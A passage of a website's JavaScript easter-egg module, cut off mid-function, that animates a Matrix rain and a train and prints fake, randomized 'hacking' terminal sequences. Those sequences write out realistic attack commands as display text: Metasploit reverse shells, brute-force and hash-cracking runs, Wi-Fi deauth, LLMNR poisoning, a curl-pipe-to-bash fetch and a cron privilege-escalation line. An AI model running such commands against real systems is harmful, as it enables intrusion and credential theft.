/* =========================================================
   Synth District — Easter Eggs & Effects
   ========================================================= */
'use strict';

window.SynthDistrict = window.SynthDistrict || {};

(function (SD) {

    function esc(s) {
        return String(s)
            .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }
    function c(text, cls) { return `<span class="${cls}">${esc(text)}</span>`; }
    function delay(ms, signal) {
        return new Promise((resolve, reject) => {
            const id = setTimeout(resolve, ms);
            if (signal) signal.addEventListener('abort', () => { clearTimeout(id); reject(new DOMException('Aborted','AbortError')); }, { once: true });
        });
    }

    /* ── Matrix digital rain ── */
    async function matrix(ctx) {
        return new Promise(resolve => {
            const canvas = document.createElement('canvas');
            canvas.id = 'matrix-canvas';
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            document.body.appendChild(canvas);
            const c2d = canvas.getContext('2d');
            const fs = 14;
            const cols = Math.floor(canvas.width / fs);
            const drops = Array.from({ length: cols }, () => Math.random() * -50);
            const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF<>[]{}|#@$%';

            const frame = () => {
                c2d.fillStyle = 'rgba(0,0,0,0.05)';
                c2d.fillRect(0, 0, canvas.width, canvas.height);
                c2d.font = fs + 'px JetBrains Mono, monospace';
                drops.forEach((y, i) => {
                    const ch = chars[Math.floor(Math.random() * chars.length)];
                    c2d.fillStyle = i === Math.floor(drops.length / 2) ? '#fff' : `hsl(${120 + Math.random()*20}, 100%, ${50 + Math.random()*20}%)`;
                    c2d.fillText(ch, i * fs, y * fs);
                    drops[i] = y > canvas.height / fs && Math.random() > 0.975 ? 0 : y + 1;
                });
            };

            const interval = setInterval(frame, 50);
            ctx.term.println(c('Matrix mode. Press any key or click to exit.', 'ansi-fg-green ansi-dim'));

            const dismiss = () => {
                clearInterval(interval);
                canvas.remove();
                document.removeEventListener('keydown', dismiss);
                resolve({ exitCode: 0 });
            };
            canvas.addEventListener('click', dismiss);
            setTimeout(() => document.addEventListener('keydown', dismiss), 200);
        });
    }

    /* ── Steam locomotive ── */
    async function sl(ctx) {
        const frames = [
`      ====        ________                ___________
 _D _|  |_______/        \\__I_I_____===__|_________|
|(_)---  |   H\\________/ |   |        =|___ ___|
/     |  |   H  |  |     |   |         ||_| |_||
|      |  |   H  |__--------------------| [___] |
| ________|___H__/__|_____/[][]~\\_______|       |
|/ |   |-----------I_____I [][] []  D   |=======|__
 \\_|__|  |_________/      |_____/~\\____/  _________  |
  |===| ~|~~~~~~~~~|~~~~~~~~~|           /___________\\
  |   |  |_________|_________|            | |       | |
  |   |   @       @           \\          /  |       |  \\
  \\= =/ =[_]=======|=======[_]=|        / [_]     [_] \\
   \\=/   |_________|_________|  \\______/               `,
        ];

        return new Promise(resolve => {
            const overlay = document.createElement('div');
            overlay.id = 'sl-overlay';
            const pre = document.createElement('pre');
            pre.textContent = frames[0];
            overlay.appendChild(pre);
            document.body.appendChild(overlay);

            const termWidth = window.innerWidth;
            let pos = termWidth;
            const frameW = 750;

            const move = setInterval(() => {
                pos -= 8;
                pre.style.left = pos + 'px';
                if (pos < -frameW) {
                    clearInterval(move);
                    overlay.remove();
                    resolve({ exitCode: 0 });
                }
            }, 30);
        });
    }

    /* ── Hack sequence ── */
    async function hack(ctx) {
        const lines = [
            [0,    'ansi-fg-green', 'Initializing exploit framework v4.2.0...'],
            [400,  'ansi-fg-green', 'Loading modules: [nmap] [metasploit] [aircrack-ng] [hydra]'],
            [600,  'ansi-fg-yellow','Scanning target network 192.168.0.0/16...'],
            [1000, 'ansi-fg-green', 'Found 247 live hosts.'],
            [400,  'ansi-fg-yellow','Selecting primary target: 192.168.1.1 (gateway)'],
            [600,  'ansi-fg-green', 'Running vulnerability assessment...'],
            [800,  'ansi-fg-green', 'CVE-2024-1337 - CRITICAL - Remote code execution'],
            [300,  'ansi-fg-green', 'CVE-2023-9999 - HIGH    - Privilege escalation'],
            [500,  'ansi-fg-bright-white ansi-bold', 'Exploiting CVE-2024-1337... '],
            [1200, 'ansi-fg-green', '[████████████████████] 100% SUCCESS'],
            [400,  'ansi-fg-bright-white ansi-bold', 'Shell obtained. Escalating privileges...'],
            [800,  'ansi-fg-green', 'root@192.168.1.1:~# '],
            [600,  'ansi-fg-yellow','Exfiltrating /etc/shadow...'],
            [700,  'ansi-fg-green', 'root:$6$rounds=65536$synth$HASH... [4 entries]'],
            [400,  'ansi-fg-yellow','Cracking hashes with rockyou.txt...'],
            [1500, 'ansi-fg-green', '[████████████████████] Cracked 3/4 passwords'],
            [300,  'ansi-fg-green', 'Pivoting to internal network...'],
            [500,  'ansi-fg-green', 'Lateral movement: 3 additional hosts compromised'],
            [800,  'ansi-fg-bright-white ansi-bold', 'ACCESSING MAINFRAME...'],
            [1000, 'ansi-fg-green', '[████████████████████] MAINFRAME ACCESS GRANTED'],
            [600,  'ansi-fg-red ansi-bold', ''],
            [400,  'ansi-fg-red ansi-bold', 'ALERT: Intrusion detection triggered!'],
            [200,  'ansi-fg-red',   'Trace route: 127.0.0.1 → 192.168.1.42 → YOU'],
            [600,  'ansi-fg-yellow','Deploying countermeasures...'],
            [800,  'ansi-fg-red ansi-bold', 'Connection terminated by remote host.'],
            [1000, 'ansi-fg-cyan',  ''],
            [200,  'ansi-fg-cyan',  '...just kidding. Nice try, though.'],
            [200,  'ansi-fg-cyan',  'This is a website. There is no mainframe.'],
            [200,  'ansi-fg-dim',   '(but check ~/.secret for something real)'],
        ];

        for (const [wait, cls, text] of lines) {
            await delay(wait, ctx.signal);
            ctx.term.println(c(text, cls));
        }
        return { exitCode: 0 };
    }

    /* ── hack --loop ── */
    async function hackLoop(ctx) {
        const rnd = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
        const ip  = () => `${rnd(1,254)}.${rnd(0,255)}.${rnd(0,255)}.${rnd(1,254)}`;
        const mac = () => Array.from({length:6}, () => rnd(0,255).toString(16).padStart(2,'0')).join(':');
        const hex = n  => rnd(0, 0xFFFFFFFF).toString(16).padStart(8,'0');
        const bar = (pct, w=20) => {
            const f = Math.round(pct/100*w);
            return '█'.repeat(f) + '░'.repeat(w-f);
        };
        const ports   = [21,22,23,25,53,80,110,139,443,445,3306,3389,5900,8080,8443,27017];
        const cves    = ['CVE-2024-3094','CVE-2023-44487','CVE-2024-1708','CVE-2023-46805',
                         'CVE-2024-21762','CVE-2023-50164','CVE-2024-4577','CVE-2023-20198',
                         'CVE-2024-6387','CVE-2023-38408'];
        const words   = ['password','123456','admin','letmein','qwerty','dragon','monkey',
                         'shadow','master','root','toor','alpine','changeme','welcome1'];
        const ssids   = ['NETGEAR_5G','ATT-WiFi-7823','xfinitywifi','HOME-4412','TP-LINK_2G',
                         'Linksys00312','DIRECT-roku-7A2B','Spectrum_2.4G'];
        const hashes  = () => Array.from({length:32}, () => rnd(0,15).toString(16)).join('');
        const sha1    = () => Array.from({length:40}, () => rnd(0,15).toString(16)).join('');
        const users   = ['admin','root','user','postgres','ubuntu','pi','guest','deploy','jenkins'];
        const domains = ['CORP','ACME','INTERNAL','ENTERPRISE'];
        const hosts   = ['DC01','WEB01','SQL01','FILE01','MAIL01','DEV01','JENKINS','GITLAB'];
        const fqdns   = ['corp.local','acme.internal','enterprise.lan','internal.net'];
        const extdoms = ['target-corp.com','acme-systems.net','enterprise-tech.io','corp-internal.com'];
        const fnames  = ['john','sarah','mike','jessica','david','emily','robert','jennifer','alex','chris'];
        const lnames  = ['smith','jones','brown','davis','wilson','taylor','anderson','thomas','martin','lee'];
        const intip   = () => `10.${rnd(0,10)}.${rnd(0,10)}.${rnd(1,254)}`;
        const sid     = () => `S-1-5-21-${rnd(1e9,9e9)}-${rnd(1e9,9e9)}-${rnd(1e9,9e9)}-${rnd(1000,9999)}`;

        /* Each scenario is an async generator that yields [delay_ms, class, text] tuples */
        const scenarios = [

            /* ── Metasploit RCE ── */
            async function*(t) {
                const tgt = ip();
                yield [0,   'ansi-fg-cyan ansi-bold', `msf6 > use exploit/multi/handler`];
                yield [300, 'ansi-fg-cyan',            `msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp`];
                yield [300, 'ansi-fg-cyan',            `msf6 exploit(multi/handler) > set LHOST ${ip()} LPORT ${rnd(4000,9999)}`];
                yield [400, 'ansi-fg-cyan',            `msf6 exploit(multi/handler) > run`];
                yield [800, 'ansi-fg-yellow',          `[*] Started reverse TCP handler on 0.0.0.0:${rnd(4000,9999)}`];
                yield [600, 'ansi-fg-yellow',          `[*] Sending stage (3045380 bytes) to ${tgt}`];
                yield [900, 'ansi-fg-green ansi-bold', `[*] Meterpreter session 1 opened (${ip()}:4444 → ${tgt}:${rnd(49152,65535)})`];
                yield [300, 'ansi-fg-green',           `meterpreter > getuid`];
                yield [400, 'ansi-fg-bright-white',    `Server username: www-data`];
                yield [300, 'ansi-fg-green',           `meterpreter > getsystem`];
                yield [600, 'ansi-fg-green ansi-bold', `...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))`];
                yield [300, 'ansi-fg-green',           `meterpreter > getuid`];
                yield [300, 'ansi-fg-bright-white',    `Server username: NT AUTHORITY\\SYSTEM`];
                yield [400, 'ansi-fg-green',           `meterpreter > hashdump`];
                for (let i = 0; i < rnd(3,6); i++) {
                    yield [200, 'ansi-fg-bright-white', `${users[i]}:${rnd(500,2000)}:aad3b435b51404eeaad3b435b51404ee:${hashes()}:::`];
                }
                yield [500, 'ansi-fg-cyan',            `meterpreter > upload /root/backdoor.elf /tmp/.hidden`];
                yield [700, 'ansi-fg-green',           `[*] uploading  : /root/backdoor.elf → /tmp/.hidden`];
                yield [400, 'ansi-fg-green',           `[*] Uploaded 45.00 KiB of 45.00 KiB (100.0%): complete`];
                yield [300, 'ansi-fg-green',           `meterpreter > shell`];
                yield [400, 'ansi-fg-bright-white',    `# id`];
                yield [300, 'ansi-fg-green',           `uid=0(root) gid=0(root) groups=0(root)`];
            },

            /* ── Hydra SSH brute-force ── */
            async function*(t) {
                const tgt = ip();
                const user = users[rnd(0, users.length-1)];
                yield [0,   'ansi-fg-cyan ansi-bold', `hydra -l ${user} -P /usr/share/wordlists/rockyou.txt ${tgt} ssh`];
                yield [400, 'ansi-fg-yellow',          `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak`];
                yield [300, 'ansi-fg-yellow',          `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)`];
                yield [300, 'ansi-fg-yellow',          `[DATA] attacking ssh://${tgt}:22/`];
                for (let i = 0; i < rnd(4,8); i++) {
                    const w = words[rnd(0,words.length-1)];
                    yield [rnd(200,500), 'ansi-fg-dim', `[ATTEMPT] target ${tgt} - login "${user}" - pass "${w}" - ${rnd(1,14344399)} of 14344399`];
                }
                const pw = words[rnd(0,words.length-1)];
                yield [600, 'ansi-fg-green ansi-bold', `[22][ssh] host: ${tgt}   login: ${user}   password: ${pw}`];
                yield [300, 'ansi-fg-green',           `1 of 1 target successfully completed, 1 valid password found`];
                yield [400, 'ansi-fg-cyan',            `ssh ${user}@${tgt}`];
                yield [500, 'ansi-fg-bright-white',    `${user}@${tgt}'s password:`];
                yield [300, 'ansi-fg-green',           `Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)`];
                yield [200, 'ansi-fg-green',           `${user}@${tgt}:~$ whoami`];
                yield [300, 'ansi-fg-bright-white',    `${user}`];
                yield [300, 'ansi-fg-green',           `${user}@${tgt}:~$ sudo -l`];
                yield [400, 'ansi-fg-green ansi-bold', `User ${user} may run the following commands as root: (ALL) NOPASSWD: ALL`];
            },

            /* ── Aircrack-ng WPA2 handshake capture ── */
            async function*(t) {
                const ssid = ssids[rnd(0, ssids.length-1)];
                const bssid = mac();
                const ch    = rnd(1,13);
                yield [0,   'ansi-fg-cyan ansi-bold', `airmon-ng start wlan0`];
                yield [500, 'ansi-fg-yellow',          `PHY\tInterface\tDriver\t\tChipset`];
                yield [200, 'ansi-fg-yellow',          `phy0\twlan0\t\tath9k_htc\tAtheros AR9271`];
                yield [300, 'ansi-fg-green',           `monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon`];
                yield [400, 'ansi-fg-cyan',            `airodump-ng wlan0mon`];
                yield [600, 'ansi-fg-yellow',          ` BSSID              PWR  Beacons  #Data  CH   ENC    ESSID`];
                for (let i = 0; i < rnd(3,6); i++) {
                    yield [200, 'ansi-fg-bright-white', ` ${mac()}   -${rnd(40,90)}  ${rnd(10,200)}     ${rnd(0,50)}  ${rnd(1,13)}   WPA2   ${ssids[rnd(0,ssids.length-1)]}`];
                }
                yield [300, 'ansi-fg-green ansi-bold', ` ${bssid}   -${rnd(30,60)}  ${rnd(10,200)}     ${rnd(0,50)}  ${ch}   WPA2   ${ssid}`];
                yield [400, 'ansi-fg-cyan',            `airodump-ng -c ${ch} --bssid ${bssid} -w capture wlan0mon`];
                yield [500, 'ansi-fg-yellow',          `CH ${ch} ][ Elapsed: 12 s ][ Capturing handshake...`];
                yield [800, 'ansi-fg-green ansi-bold', `WPA handshake: ${bssid}`];
                yield [400, 'ansi-fg-cyan',            `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`];
                yield [300, 'ansi-fg-yellow',          `Reading packets, please wait...`];
                yield [300, 'ansi-fg-yellow',          `Opening capture-01.cap`];
                yield [200, 'ansi-fg-yellow',          `Read 1847 packets.`];
                yield [200, 'ansi-fg-yellow',          `1 handshake found.`];
                for (let i = 0; i < rnd(3,6); i++) {
                    yield [rnd(200,400), 'ansi-fg-dim', `[${bar(rnd(10,90))}] ${rnd(1,14344399)}/14344399 keys tested`];
                }
                const pw = words[rnd(0,words.length-1)] + rnd(100,9999);
                yield [600, 'ansi-fg-green ansi-bold', `KEY FOUND! [ ${pw} ]`];
                yield [300, 'ansi-fg-green',           `Master Key     : ${hashes().toUpperCase()} ${hashes().toUpperCase()}`];
                yield [300, 'ansi-fg-green',           `Transient Key  : ${hashes().toUpperCase()} ${hashes().toUpperCase()}`];
            },

            /* ── SQLMap injection ── */
            async function*(t) {
                const tgt   = `http://${ip()}/login.php?id=${rnd(1,100)}`;
                const db    = ['MySQL','PostgreSQL','Microsoft SQL Server','Oracle'][rnd(0,3)];
                yield [0,   'ansi-fg-cyan ansi-bold', `sqlmap -u "${tgt}" --dbs --batch`];
                yield [400, 'ansi-fg-yellow',          `        ___`];
                yield [100, 'ansi-fg-yellow',          `       __H__`];
                yield [100, 'ansi-fg-yellow',          ` ___ ___["]_____ ___ ___  {1.8.2#stable}`];
                yield [100, 'ansi-fg-yellow',          `|_ -| . [.]     | .'| . |`];
                yield [100, 'ansi-fg-yellow',          `|___|_  ["]_|_|_|__,|  _|`];
                yield [100, 'ansi-fg-yellow',          `      |_|V...       |_|   https://sqlmap.org`];
                yield [400, 'ansi-fg-bright-white',    `[*] starting @ ${new Date().toTimeString().split(' ')[0]}`];
                yield [300, 'ansi-fg-yellow',          `[INFO] testing connection to the target URL`];
                yield [300, 'ansi-fg-yellow',          `[INFO] testing if the target URL content is stable`];
                yield [400, 'ansi-fg-yellow',          `[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable`];
                yield [500, 'ansi-fg-green',           `[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable`];
                yield [400, 'ansi-fg-green',           `[INFO] target URL appears to be UNION injectable with 5 columns`];
                yield [300, 'ansi-fg-green ansi-bold', `[INFO] the back-end DBMS is ${db}`];
                yield [500, 'ansi-fg-bright-white',    `available databases [${rnd(2,6)}]:`];
                for (const name of ['information_schema','mysql','users_db','shop_db','admin'].slice(0,rnd(2,5))) {
                    yield [200, 'ansi-fg-green', `[*] ${name}`];
                }
                yield [400, 'ansi-fg-cyan',            `sqlmap -u "${tgt}" -D users_db --tables --batch`];
                yield [500, 'ansi-fg-green',           `Database: users_db — 3 tables`];
                for (const t2 of ['users','sessions','admin_logs']) yield [200, 'ansi-fg-green', `  ${t2}`];
                yield [400, 'ansi-fg-cyan',            `sqlmap -u "${tgt}" -D users_db -T users --dump --batch`];
                yield [600, 'ansi-fg-green ansi-bold', `Table: users — ${rnd(10,500)} entries`];
                yield [200, 'ansi-fg-bright-white',    `id | username | password_hash                     | email`];
                yield [200, 'ansi-fg-bright-white',    `---+----------+-----------------------------------+---------------------`];
                for (let i = 1; i <= rnd(3,6); i++) {
                    yield [150, 'ansi-fg-green', `${i}  | ${users[rnd(0,users.length-1)].padEnd(8)} | ${hashes()} | user${i}@${['gmail','yahoo','corp'][rnd(0,2)]}.com`];
                }
            },

            /* ── Hashcat GPU cracking ── */
            async function*(t) {
                const mode = [['0','MD5'],['1000','NTLM'],['1800','sha512crypt'],['2500','WPA-PBKDF2'],['3200','bcrypt']][rnd(0,4)];
                yield [0,   'ansi-fg-cyan ansi-bold', `hashcat -m ${mode[0]} hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule`];
                yield [400, 'ansi-fg-yellow',          `hashcat (v6.2.6) starting...`];
                yield [200, 'ansi-fg-yellow',          `Device #1: NVIDIA GeForce RTX 4090, 24217/24217 MB, 128MCU`];
                yield [300, 'ansi-fg-yellow',          `Hash-mode ${mode[0]} (${mode[1]})`];
                yield [300, 'ansi-fg-yellow',          `Dictionary cache hit: /usr/share/wordlists/rockyou.txt`];
                yield [200, 'ansi-fg-yellow',          `  * Filename..: /usr/share/wordlists/rockyou.txt`];
                yield [200, 'ansi-fg-yellow',          `  * Passwords.: 14344385`];
                yield [200, 'ansi-fg-yellow',          `  * Bytes.....: 139921507`];
                let progress = 0;
                while (progress < 100) {
                    progress += rnd(8, 20);
                    if (progress > 100) progress = 100;
                    const speed = `${rnd(800,9999)}.${rnd(0,9)} MH/s`;
                    yield [rnd(300,600), 'ansi-fg-bright-white', `Progress: ${bar(progress)} ${progress}% — Speed: ${speed}`];
                }
                const cracked = rnd(3,8);
                yield [300, 'ansi-fg-green ansi-bold', `Session..........: hashcat — Status: Cracked`];
                yield [200, 'ansi-fg-green',           `Recovered........: ${cracked}/${cracked} (100.00%) Digests`];
                for (let i = 0; i < cracked; i++) {
                    yield [200, 'ansi-fg-bright-white', `${hashes()}:${words[rnd(0,words.length-1)]}${rnd(0,9999)}`];
                }
            },

            /* ── nmap full port scan + NSE ── */
            async function*(t) {
                const tgt = ip();
                yield [0,   'ansi-fg-cyan ansi-bold', `nmap -sV -sC -O -p- --min-rate 5000 ${tgt}`];
                yield [400, 'ansi-fg-yellow',          `Starting Nmap 7.95 ( https://nmap.org ) at ${new Date().toISOString().replace('T',' ').slice(0,19)}`];
                yield [300, 'ansi-fg-yellow',          `Nmap scan report for ${tgt}`];
                yield [200, 'ansi-fg-yellow',          `Host is up (${(rnd(1,50)/1000).toFixed(3)}s latency).`];
                const openPorts = ports.sort(()=>Math.random()-0.5).slice(0, rnd(4,8));
                yield [300, 'ansi-fg-bright-white',    `PORT      STATE  SERVICE    VERSION`];
                for (const p of openPorts) {
                    const svc = {21:'ftp',22:'ssh',23:'telnet',25:'smtp',53:'dns',80:'http',110:'pop3',139:'netbios',
                                  443:'https',445:'smb',3306:'mysql',3389:'ms-wbt-server',5900:'vnc',8080:'http-proxy',
                                  8443:'https-alt',27017:'mongod'}[p] || 'unknown';
                    yield [150, 'ansi-fg-green', `${String(p).padEnd(9)} open   ${svc.padEnd(10)} OpenSSH 8.9p1 / Apache 2.4.58`];
                }
                yield [400, 'ansi-fg-yellow',          `OS details: Linux 4.15 - 5.19, Ubuntu 22.04`];
                yield [300, 'ansi-fg-yellow',          `Aggressive OS guesses: Linux 5.15 (95%), Linux 5.4 (90%)`];
                const cve = cves[rnd(0, cves.length-1)];
                yield [400, 'ansi-fg-red ansi-bold',   `NSE: ${cve} — VULNERABLE`];
                yield [300, 'ansi-fg-red',              `  State: VULNERABLE (Exploitable)`];
                yield [200, 'ansi-fg-red',              `  Disclosure date: 2024-01-15`];
                yield [200, 'ansi-fg-red',              `  References: https://nvd.nist.gov/vuln/detail/${cve}`];
                yield [300, 'ansi-fg-green ansi-bold', `Nmap done: 1 IP address (1 host up) scanned in ${rnd(30,240)}.${rnd(0,99)} seconds`];
            },

            /* ── John the Ripper ── */
            async function*(t) {
                yield [0,   'ansi-fg-cyan ansi-bold', `john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt`];
                yield [400, 'ansi-fg-yellow',          `Using default input encoding: UTF-8`];
                yield [200, 'ansi-fg-yellow',          `Loaded ${rnd(2,10)} password hashes with ${rnd(1,5)} different salts (sha512crypt, crypt(3) [SHA512 128/128 AVX 2x])`];
                yield [300, 'ansi-fg-yellow',          `Cost 1 (iteration count) is 5000 for all loaded hashes`];
                yield [300, 'ansi-fg-yellow',          `Will run ${rnd(4,16)} OpenMP threads`];
                yield [200, 'ansi-fg-yellow',          `Press 'q' or Ctrl-C to abort, almost any other key for status`];
                for (let i = 0; i < rnd(3,6); i++) {
                    yield [rnd(400,800), 'ansi-fg-green', `${words[rnd(0,words.length-1)].padEnd(20)} (${users[rnd(0,users.length-1)]})`];
                }
                yield [400, 'ansi-fg-green ansi-bold', `${rnd(2,8)}g ${rnd(0,1)}:00:00:${rnd(10,59)} DONE (${new Date().toISOString().slice(0,10)}) ${rnd(1,10)}.${rnd(0,9)}g/s ${rnd(2000,9999)}p/s`];
                yield [200, 'ansi-fg-green',           `Use the "--show" option to display all of the cracked passwords reliably`];
            },

            /* ── Burp Suite / web app ── */
            async function*(t) {
                const tgt = `http://${ip()}:${rnd(80,8443)}`;
                yield [0,   'ansi-fg-cyan ansi-bold', `[Burp Suite Pro] Scanning ${tgt}`];
                yield [400, 'ansi-fg-yellow',          `[*] Spider crawl complete — ${rnd(50,300)} URLs discovered`];
                yield [400, 'ansi-fg-yellow',          `[*] Running active scan...`];
                const issues = [
                    ['SQL injection','Critical'],['Reflected XSS','High'],['IDOR','High'],
                    ['Path traversal','High'],['CSRF','Medium'],['Clickjacking','Low'],
                    ['Insecure direct object reference','High'],['Open redirect','Medium'],
                    ['XXE injection','Critical'],['SSRF','Critical'],
                ];
                const found = issues.sort(()=>Math.random()-0.5).slice(0, rnd(3,6));
                for (const [iss, sev] of found) {
                    const col = sev==='Critical'?'ansi-fg-red ansi-bold':sev==='High'?'ansi-fg-red':sev==='Medium'?'ansi-fg-yellow':'ansi-fg-cyan';
                    yield [rnd(300,700), col, `  [${sev.toUpperCase()}] ${iss} — ${tgt}/page${rnd(1,50)}.php`];
                }
                yield [400, 'ansi-fg-green ansi-bold', `[*] Scan complete. ${found.length} issues found.`];
            },

            /* ── Gobuster directory brute ── */
            async function*(t) {
                const tgt = `http://${ip()}`;
                yield [0,   'ansi-fg-cyan ansi-bold', `gobuster dir -u ${tgt} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`];
                yield [300, 'ansi-fg-yellow',          `===============================================================`];
                yield [100, 'ansi-fg-yellow',          `Gobuster v3.6 — by OJ Reeves (@TheColonial) & Christian Mehlmauer`];
                yield [100, 'ansi-fg-yellow',          `===============================================================`];
                yield [100, 'ansi-fg-yellow',          `[+] Url:      ${tgt}`];
                yield [100, 'ansi-fg-yellow',          `[+] Wordlist: directory-list-2.3-medium.txt (220560 words)`];
                yield [100, 'ansi-fg-yellow',          `[+] Threads:  10`];
                yield [100, 'ansi-fg-yellow',          `===============================================================`];
                const dirs = ['/admin','/backup','/config','/uploads','/api','/dev','/test',
                              '/secret','.git','/phpinfo.php','/wp-admin','/shell.php',
                              '/old','/staging','/internal','/dashboard'];
                const found2 = dirs.sort(()=>Math.random()-0.5).slice(0,rnd(4,9));
                for (const d of found2) {
                    const code = [200,200,200,301,302,403][rnd(0,5)];
                    const col  = code===200?'ansi-fg-green':code===403?'ansi-fg-yellow':'ansi-fg-cyan';
                    yield [rnd(150,400), col, `/${d.replace('/','').padEnd(20)} (Status: ${code}) [Size: ${rnd(100,50000)}]`];
                }
                yield [300, 'ansi-fg-green ansi-bold', `Progress: 220560 / 220561 (100.00%) — Done`];
            },

            /* ── Evil-Twin / Deauth attack ── */
            async function*(t) {
                const bssid = mac();
                const client = mac();
                const ssid = ssids[rnd(0,ssids.length-1)];
                yield [0,   'ansi-fg-cyan ansi-bold', `aireplay-ng --deauth 100 -a ${bssid} -c ${client} wlan0mon`];
                yield [300, 'ansi-fg-yellow',          `${new Date().toISOString().slice(11,19)} Waiting for beacon frame (BSSID: ${bssid}) on channel ${rnd(1,13)}`];
                yield [400, 'ansi-fg-yellow',          `${new Date().toISOString().slice(11,19)} Sending 64 directed DeAuth (code 7). STMAC: [${client}]`];
                for (let i = 0; i < rnd(4,8); i++) {
                    yield [rnd(200,500), 'ansi-fg-red', `  ${rnd(0,64)} [${ rnd(0,64)}| ${rnd(0,64)}] DeAuth to station`];
                }
                yield [600, 'ansi-fg-green ansi-bold', `Client ${client} disconnected from ${ssid}`];
                yield [400, 'ansi-fg-cyan',            `hostapd-wpe -i wlan1 evil_twin.conf`];
                yield [400, 'ansi-fg-yellow',          `[*] Setting up rogue AP: ${ssid}`];
                yield [500, 'ansi-fg-green',           `[*] Client ${client} connected to rogue AP`];
                yield [400, 'ansi-fg-green',           `[*] Captured RADIUS credentials:`];
                yield [200, 'ansi-fg-bright-white',    `    Username: ${users[rnd(0,users.length-1)]}`];
                yield [200, 'ansi-fg-bright-white',    `    Challenge: ${hashes()}`];
                yield [200, 'ansi-fg-bright-white',    `    Response:  ${hashes()}`];
            },

            /* ── Privilege escalation (LinPEAS) ── */
            async function*(t) {
                const tgt = ip();
                yield [0,   'ansi-fg-cyan ansi-bold', `www-data@${tgt}:/var/www/html$ curl -s https://github.com/carlospolop/PEASS-ng/linpeas.sh | bash`];
                yield [400, 'ansi-fg-yellow ansi-bold','╔══════════╗'];
                yield [100, 'ansi-fg-yellow ansi-bold','║ LinPEAS  ║  Linux Privilege Escalation Awesome Script'];
                yield [100, 'ansi-fg-yellow ansi-bold','╚══════════╝'];
                yield [300, 'ansi-fg-yellow',          `[*] Running checks as www-data on Linux 5.15.0-91-generic`];
                yield [300, 'ansi-fg-red ansi-bold',   `[!] sudo version 1.8.31 — VULNERABLE: CVE-2021-3156 (Baron Samedit)`];
                yield [200, 'ansi-fg-red',              `    Exploit: https://github.com/blasty/CVE-2021-3156`];
                yield [300, 'ansi-fg-red ansi-bold',   `[!] SUID binary found: /usr/bin/pkexec`];
                yield [200, 'ansi-fg-red',              `    PwnKit (CVE-2021-4034) — local root exploit`];
                yield [300, 'ansi-fg-yellow',          `[*] Cron jobs:`];
                yield [200, 'ansi-fg-bright-white',    `    */5 * * * * root /opt/backup.sh`];
                yield [300, 'ansi-fg-red',              `[!] /opt/backup.sh is world-writable!`];
                yield [400, 'ansi-fg-cyan',            `echo "chmod +s /bin/bash" >> /opt/backup.sh`];
                yield [600, 'ansi-fg-yellow',          `[*] Waiting for cron...`];
                yield [800, 'ansi-fg-green ansi-bold', `/bin/bash -p`];
                yield [300, 'ansi-fg-bright-white',    `bash-5.1# id`];
                yield [300, 'ansi-fg-green ansi-bold', `uid=0(root) gid=0(root) euid=0(root)`];
            },

            /* ── Responder LLMNR poison + NTLMv2 crack ── */
            async function*(t) {
                const iface   = ['eth0','ens18','ens33','enp3s0'][rnd(0,3)];
                const victim  = intip();
                const domain  = domains[rnd(0, domains.length-1)];
                const uname   = users[rnd(0, users.length-1)];
                const ntlm    = `${uname}::${domain}:${hashes()}:${hashes()}:010100000000000080${hashes()}0000000002000800${hashes()}`;
                yield [0,   'ansi-fg-cyan ansi-bold',  `python3 Responder.py -I ${iface} -wrf`];
                yield [200, 'ansi-fg-yellow ansi-bold', `                                         __`];
                yield [100, 'ansi-fg-yellow ansi-bold', `  .----.-----.-----.-----.-----.-----.--|  |.-----.----.`];
                yield [100, 'ansi-fg-yellow ansi-bold', `  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|`];
                yield [100, 'ansi-fg-yellow ansi-bold', `  |__| |_____|_____|   __|_____|__|__|_____||_____|__|`];
                yield [100, 'ansi-fg-yellow ansi-bold', `                   |__|`];
                yield [200, 'ansi-fg-yellow',           `           NBT-NS, LLMNR & MDNS Responder 3.1.4.0`];
                yield [200, 'ansi-fg-green',            `[+] Poisoners:   LLMNR, NBT-NS, MDNS, DNS, DHCP`];
                yield [100, 'ansi-fg-green',            `[+] Servers:     HTTP, HTTPS, WPAD, Auth, SMB, Kerberos, SQL, FTP, IMAP, POP3, SMTP, DNS, LDAP`];
                yield [300, 'ansi-fg-yellow',           `[*] Listening for events on ${iface}...`];
                yield [rnd(900,1400), 'ansi-fg-dim',    `[*] [LLMNR] Poisoned answer sent to ${victim} for name ${domain.toLowerCase()}-nas`];
                yield [300, 'ansi-fg-dim',              `[*] [NBT-NS] Poisoned answer sent to ${victim} for name WORKGROUP (service: File Server)`];
                yield [400, 'ansi-fg-green ansi-bold',  `[SMB] NTLMv2-SSP Client   : ${victim}`];
                yield [100, 'ansi-fg-green ansi-bold',  `[SMB] NTLMv2-SSP Username : ${domain}\\${uname}`];
                yield [100, 'ansi-fg-bright-white',     `[SMB] NTLMv2-SSP Hash     : ${ntlm}`];
                yield [400, 'ansi-fg-cyan',             `echo '${ntlm}' > ntlm.hash`];
                yield [200, 'ansi-fg-cyan',             `hashcat -m 5600 ntlm.hash /usr/share/wordlists/rockyou.txt --force`];
                yield [300, 'ansi-fg-yellow',           `hashcat (v6.2.6) — Hash-mode 5600 (NetNTLMv2)`];
                yield [200, 'ansi-fg-yellow',           `Device #1: NVIDIA GeForce RTX 4090, 24217 MB`];
                let p = 0;
                while (p < 100) { p = Math.min(100, p + rnd(15,30)); yield [rnd(300,550), 'ansi-fg-bright-white', `Progress: ${bar(p)} ${p}% — Speed: ${rnd(3000,9999)} MH/s`]; }
